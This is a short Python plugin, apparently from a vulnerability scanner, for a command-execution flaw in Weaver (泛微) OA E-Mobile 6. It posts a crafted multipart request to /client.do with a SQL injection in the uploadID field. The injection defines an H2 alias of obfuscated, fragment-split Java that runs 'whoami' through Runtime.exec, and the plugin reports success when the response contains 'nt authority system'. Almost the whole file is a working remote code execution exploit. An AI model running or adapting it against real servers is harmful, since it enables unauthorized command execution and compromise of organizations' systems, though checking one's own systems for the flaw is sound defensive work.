#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   '泛微OA E Mobile_6 命令执行',

      'level'     :   'high',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      'Accept-Encoding': '',
      "Content-Type": "multipart/form-data;boundary=----WebKitFormBoundaryTm8YXcJeyKDClbU7"
      }
  vulurl1 = url + "/client.do"
  data = '''
    ------WebKitFormBoundaryTm8YXcJeyKDClbU7
    Content-Disposition: form-data; name="method"

    getupload
    ------WebKitFormBoundaryTm8YXcJeyKDClbU7
    Content-Disposition: form-data; name="uploadID"

    1';CREATE ALIAS if not exists MzSNqKsZTagmf AS CONCAT('void e(String cmd) throws java.la','ng.Exception{','Object curren','tRequest = Thre','ad.currentT','hread().getConte','xtClass','Loader().loadC','lass("com.caucho.server.dispatch.ServletInvocation").getMet','hod("getContextRequest").inv','oke(null);java.la','ng.reflect.Field _responseF = currentRequest.getCl','ass().getSuperc','lass().getDeclar','edField("_response");_responseF.setAcce','ssible(true);Object response = _responseF.get(currentRequest);java.la','ng.reflect.Method getWriterM = response.getCl','ass().getMethod("getWriter");java.i','o.Writer writer = (java.i','o.Writer)getWriterM.inv','oke(response);java.ut','il.Scan','ner scan','ner = (new java.util.Scann','er(Runt','ime.getRunt','ime().ex','ec(cmd).getInput','Stream())).useDelimiter("\\A");writer.write(scan','ner.hasNext()?sca','nner.next():"");}');CALL MzSNqKsZTagmf('whoami');--
    ------WebKitFormBoundaryTm8YXcJeyKDClbU7--

  '''

  try:
    res=requests.post(url=vulurl1,headers=headers,data=data,timeout=5,verify=False)
    # print(res.text)
    if res.status_code == 200 and re.search(r"nt.*?authority.*?system",res.text,re.S):
      ret['url'] = vulurl1
      ret['huixian'] = res.text
      ret['ifbug'] = True
      res.close()
      return ret
    else:
      return ret
  except:
    return ret